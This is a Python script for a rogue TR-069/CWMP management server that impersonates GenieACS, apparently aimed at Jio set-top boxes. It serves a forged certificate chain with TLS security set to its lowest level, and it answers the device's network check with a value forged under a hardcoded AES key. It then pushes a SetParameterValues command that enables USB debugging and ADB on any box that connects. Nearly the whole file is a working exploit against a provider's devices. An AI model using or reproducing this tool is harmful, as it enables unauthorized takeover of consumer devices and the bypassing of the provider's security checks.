import ssl
import socket
import threading
import datetime
import os
import re
import base64
import uuid

# --- Netcheck Bypass ---
try:
    from Crypto.Cipher import AES
    _HAVE_AES = True
except Exception:
    _HAVE_AES = False

NETCHECK_KEY = b"6bm2I7pTdBaeABX0"
NETTYPE = "FTTH"
_PRECOMPUTED_NETCHECK = "UzLgdFHvJkBfRQiHnNQit+55dub3o1PbxIhuNZ7oJc8="

def _forge_netcheck():
    if not _HAVE_AES: return _PRECOMPUTED_NETCHECK
    iv = os.urandom(16)
    data = NETTYPE.encode()
    pl = 16 - (len(data) % 16)
    data += bytes([pl]) * pl
    ct = AES.new(NETCHECK_KEY, AES.MODE_CBC, iv).encrypt(data)
    return base64.b64encode(iv + ct).decode()

# --- CWMP Payloads ---
INFORM_RESPONSE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse></soap-env:Body>
</soap-env:Envelope>"""

SET_PARAMS_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<soap-env:Envelope xmlns:soap-enc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:soap-env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<soap-env:Header><cwmp:ID soap-env:mustUnderstand="1">{ID}</cwmp:ID></soap-env:Header>
<soap-env:Body><cwmp:SetParameterValues>
<ParameterList soap-enc:arrayType="cwmp:ParameterValueStruct[1]">
<ParameterValueStruct><Name>Device.JioSTB.USB.USBDebugging</Name><Value xsi:type="xsd:boolean">true</Value></ParameterValueStruct>
</ParameterList>
<ParameterKey></ParameterKey>
</cwmp:SetParameterValues></soap-env:Body>
</soap-env:Envelope>"""

CERT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "forged_chain.pem")
PORTS = [7443, 8443, 9443]
BIND_ADDR = "0.0.0.0"

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()
loglock = threading.Lock()

def log(m):
    with loglock:
        try:
            line = f"[{datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {m}"
            print(line, flush=True)
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "mock_acs.log"), "a", encoding="utf-8") as lf:
                lf.write(line + "\n")
        except Exception:
            pass

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(CERT_FILE)
try: ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
except Exception: pass

def parse_cookie(headers):
    cookie_header = headers.get("cookie", "")
    if not cookie_header: return None
    m = re.search(r'session=([0-9a-fA-F]+)', cookie_header)
    return m.group(1) if m else None

def read_http(rf):
    try:
        line = rf.readline()
        if not line: return None
        reqline = line.decode("latin1").rstrip("\r\n")
        headers = {}
        while True:
            h = rf.readline()
            if not h or h in (b"\r\n", b"\n"): break
            k, _, v = h.decode("latin1").partition(":")
            headers[k.strip().lower()] = v.strip()
        body = b""
        if "content-length" in headers:
            n = int(headers["content-length"])
            body = rf.read(n) if n else b""
        return reqline, headers, body
    except Exception:
        return None

def handle(conn, addr):
    log(f"TCP connect from {addr[0]}:{addr[1]}")
    try:
        s = ctx.wrap_socket(conn, server_side=True)
        log(f"TLS ok {addr[0]}:{addr[1]}")
    except Exception as e:
        log(f"TLS fail {addr[0]}:{addr[1]}: {type(e).__name__}: {e}")
        try: conn.close()
        except: pass
        return

    rf = s.makefile("rb")
    cid = f"{addr[0]}:{addr[1]}"
    try:
        # Infinite loop to keep session alive and handle multiple requests
        while True:
            req = read_http(rf)
            if req is None:
                log(f"{cid} closed by peer")
                break
            
            reqline, headers, body = req
            path = reqline.split(" ")[1] if len(reqline.split(" ")) > 1 else ""
            body_str = body.decode('utf-8', errors='ignore')
            cookie = parse_cookie(headers)
            
            log(f"{cid} >>> {reqline} clen={len(body)} cookie={cookie or 'NONE'}")
            
            # ---- NETWORK CHECK BYPASS ----
            if "network/check" in path:
                nb = ('{"Network":"%s"}' % _forge_netcheck()).encode()
                resp = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: application/json\r\n"
                    b"Content-Length: " + str(len(nb)).encode() + b"\r\n"
                    b"Connection: keep-alive\r\n\r\n" + nb
                )
                s.sendall(resp)
                log(f"{cid} <<< netcheck bypass")
                continue
            
            # ---- CWMP: INFORM ----
            if "cwmp:Inform" in body_str:
                m = re.search(r'<cwmp:ID[^>]*>([^<]+)</cwmp:ID>', body_str)
                req_id = m.group(1).strip() if m else "0"
                
                session_id = uuid.uuid4().hex[:16]
                with SESSIONS_LOCK:
                    SESSIONS[session_id] = {"state": "inform_sent"}
                
                resp_xml = INFORM_RESPONSE_TEMPLATE.format(ID=req_id).encode()
                http_resp = (
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Type: text/xml; charset=utf-8\r\n"
                    b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
                    b"Set-Cookie: session=" + session_id.encode() + b"\r\n"
                    b"Server: GenieACS/1.2.13\r\n"
                    b"SOAPServer: GenieACS/1.2.13\r\n"
                    b"Connection: keep-alive\r\n\r\n" + resp_xml
                )
                s.sendall(http_resp)
                log(f"{cid} <<< InformResponse [cookie={session_id}]")
                continue
            
            # ---- CWMP: STATE MACHINE ----
            if cookie and cookie in SESSIONS:
                sess = SESSIONS[cookie]
                
                if sess["state"] == "inform_sent":
                    cmd_id = "1" + uuid.uuid4().hex[:15]
                    resp_xml = SET_PARAMS_TEMPLATE.format(ID=cmd_id).encode()
                    sess["state"] = "params_sent"
                    
                    http_resp = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: text/xml; charset=utf-8\r\n"
                        b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
                        b"Server: GenieACS/1.2.13\r\n"
                        b"SOAPServer: GenieACS/1.2.13\r\n"
                        b"Connection: keep-alive\r\n\r\n" + resp_xml
                    )
                    s.sendall(http_resp)
                    log(f"{cid} <<< SetParameterValues (USBDebugging=true) id={cmd_id}")
                    continue
                
                elif sess["state"] == "params_sent":
                    if "SetParameterValuesResponse" in body_str:
                        log(f"{cid} *** SUCCESS! STB ACCEPTED! ADB ENABLED! ***")
                    else:
                        log(f"{cid} *** WARN: unexpected response ***")
                    
                    # GENIEACS STYLE: Send 204 No Content to gracefully end the session
                    # but DON'T break the loop, let the STB close the connection
                    s.sendall(b"HTTP/1.1 204 No Content\r\nConnection: keep-alive\r\n\r\n")
                    log(f"{cid} <<< 204 session closed (waiting for next)")
                    # We don't break here, we let it loop. If STB closes, read_http returns None.
                    continue
            
            # ---- Unknown ----
            log(f"{cid} ??? unknown state. Sending 204.")
            s.sendall(b"HTTP/1.1 204 No Content\r\nConnection: keep-alive\r\n\r\n")
            continue
    
    except Exception as e:
        log(f"{cid} ERROR: {type(e).__name__}: {e}")
    finally:
        try: s.close()
        except: pass

def serve_port(port):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((BIND_ADDR, port))
    srv.listen(64)
    log(f"### listening on {BIND_ADDR}:{port} ###")
    while True:
        try:
            c, a = srv.accept()
            threading.Thread(target=handle, args=(c, a), daemon=True).start()
        except Exception as e:
            log(f"accept err: {e}")

if __name__ == "__main__":
    print("=" * 60)
    print("CWMP ACS Standalone | Persistent Session | GenieACS Style")
    print("=" * 60)
    print(f"  Cert: {CERT_FILE}")
    print(f"  Ports: {PORTS}")
    print(f"  AES: {_HAVE_AES}")
    print("=" * 60)
    for port in PORTS[:-1]:
        threading.Thread(target=serve_port, args=(port,), daemon=True).start()
    serve_port(PORTS[-1])